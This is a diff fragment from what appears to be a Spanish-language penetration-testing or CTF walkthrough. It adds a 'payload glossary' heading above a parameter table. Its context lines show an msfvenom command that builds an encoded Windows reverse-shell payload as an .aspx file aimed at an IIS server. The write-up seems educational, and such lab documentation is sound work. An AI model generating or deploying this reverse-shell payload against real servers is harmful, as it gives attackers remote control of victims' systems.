@@ -48,6 +48,9 @@ Utilizamos la extensión `.aspx` porque el servidor web está ejecutando IIS con
 ```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.176.220 LPORT=4444 -e x64/shikata_ga_nai -f aspx -o shell.aspx
 ```
+
+Glosario del payload:
+
 | **Parámetro** | **Descripción** |
 |---|---|
 | `-p windows/x64/shell_reverse_tcp` | Reverse shell de 64 bits. |
